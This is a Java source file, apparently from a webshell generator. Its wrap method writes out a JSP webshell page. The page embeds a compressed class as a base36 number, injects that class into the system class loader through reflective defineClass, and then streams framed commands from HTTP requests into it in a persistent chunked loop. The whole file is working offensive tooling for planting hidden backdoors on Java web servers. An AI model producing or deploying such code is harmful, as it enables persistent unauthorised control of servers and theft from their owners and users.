package org.leo.jmg.jsp.httpchunk;

import org.leo.jmg.jsp.WebShellRequestGuard;


import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.util.zip.GZIPOutputStream;

public class JspServer {
    public String wrap(String coreClassName,byte[] coreClass,int respCode) throws IOException {
        return wrap(coreClassName, coreClass, respCode, null, null);
    }

    public String wrap(String coreClassName, byte[] coreClass, int respCode,
                       String headerName, String headerValue) throws IOException {
        if (respCode < 200 || respCode == 204 || respCode == 205 || respCode == 304) {
            throw new IllegalArgumentException("httpchunk响应状态必须允许持续响应体: " + respCode);
        }

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStream);
        gzipOutputStream.write(coreClass);
        gzipOutputStream.finish();
        gzipOutputStream.close();
        BigInteger bigInteger = new BigInteger(1, byteArrayOutputStream.toByteArray());


        StringBuilder sb = new StringBuilder();
        sb.append("<%@ page import=\"java.io.*\" %>\n" +
                  "<%@ page import=\"java.util.zip.GZIPInputStream\" %>\n" +
                  "<%@ page import=\"java.math.BigInteger\" %>\n" +
                  "<%@ page import=\"java.lang.reflect.Method\" %>\n" +
                  "<%\n" +
                  WebShellRequestGuard.source(headerName, headerValue, "    ") +
                  "    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n" +
                  "    byte[] buffer = new byte[1024];\n" +
                  "    int bytesRead;\n" +
                  "    try {\n" +
                  "        Class.forName(\""+coreClassName+"\");\n" +
                  "    } catch (ClassNotFoundException e) {\n" +
                  "        String cls=\""+bigInteger.toString(36)+"\";\n" +
                  "        byte[] clsBytes=new BigInteger(cls,36).toByteArray();\n" +
                  "        if(clsBytes[0]==0){byte[] tmp=new byte[clsBytes.length-1];System.arraycopy(clsBytes,1,tmp,0,tmp.length);clsBytes=tmp;}\n" +
                  "        GZIPInputStream gzipInputStream=new GZIPInputStream(new ByteArrayInputStream(clsBytes));\n" +
                  "        while ((bytesRead = gzipInputStream.read(buffer)) != -1) {\n" +
                  "            byteArrayOutputStream.write(buffer, 0, bytesRead);\n" +
                  "        }\n" +
                  "        Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\",new Class[]{String.class, byte[].class, int.class, int.class});\n" +
                  "        defineClassMethod.setAccessible(true);\n" +
                  "        defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),new Object[]{null, byteArrayOutputStream.toByteArray(), (Object) 0, (Object) byteArrayOutputStream.size()});\n" +
                  "    }\n" +
                  "    DataInputStream dataInputStream=new DataInputStream(request.getInputStream());\n" +
                  "    response.setStatus("+respCode+");\n" +
                  "    response.setHeader(\"X-Accel-Buffering\", \"no\");\n" +
                  "    response.setHeader(\"Connection\", \"keep-alive\");\n" +
                  "    response.setContentType(\"application/octet-stream\");\n" +
                  "    response.setBufferSize(8192);\n" +
                  "    DataOutputStream dataOutputStream=new DataOutputStream(response.getOutputStream());\n" +
                  "    dataOutputStream.flush();\n" +
                  "    while (true){\n" +
                  "        int frameType=dataInputStream.readUnsignedByte();\n" +
                  "        long transportId=dataInputStream.readLong();\n" +
                  "        int dataLen=dataInputStream.readInt();\n" +
                  "        if(dataLen<0||dataLen>16777216){break;}\n" +
                  "        byte[] data =new byte[dataLen];\n" +
                  "        dataInputStream.readFully(data);\n" +
                  "        if(frameType==4){break;}\n" +
                  "        if(frameType==3){continue;}\n" +
                  "        int responseType;\n" +
                  "        byte[] respData;\n" +
                  "        if(frameType==2&&dataLen==0){\n" +
                  "            responseType=3;respData=new byte[0];\n" +
                  "        }else if(frameType==1){\n" +
                  "            responseType=1;\n" +
                  "            byteArrayOutputStream=new ByteArrayOutputStream();\n" +
                  "            byteArrayOutputStream.write(data);\n" +
                  "            ((java.lang.reflect.InvocationHandler)Class.forName(\""+coreClassName+"\").newInstance()).invoke(null, null, new Object[]{byteArrayOutputStream});\n" +
                  "            respData=byteArrayOutputStream.toByteArray();\n" +
                  "        }else{break;}\n" +
                  "        if(respData.length>16777216){break;}\n" +
                  "        dataOutputStream.writeByte(responseType);\n" +
                  "        dataOutputStream.writeLong(transportId);\n" +
                  "        dataOutputStream.writeInt(respData.length);\n" +
                  "        dataOutputStream.write(respData);\n" +
                  "        dataOutputStream.flush();\n" +
                  "    }\n" +
                  "%>");
        return sb.toString();
    }
}
